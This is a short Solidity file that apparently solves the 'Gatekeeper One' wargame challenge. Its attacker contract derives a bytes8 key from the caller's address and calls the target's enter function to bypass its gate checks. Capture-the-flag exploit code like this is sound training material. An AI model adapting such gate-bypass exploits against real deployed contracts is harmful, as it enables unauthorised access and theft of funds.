pragma solidity ^0.6.0;

import "./IGatekeeper.sol";

contract GatekeeperOneAttacker {
    constructor() public {}

    function attack(address targetAddr) external {
        IGatekeeper target = IGatekeeper(targetAddr);
        bytes8 key = bytes8(uint64(uint16(msg.sender)));
        bool result = target.enter(key);
        if (!result) {
            revert("Failed to enter");
        }
    }
}
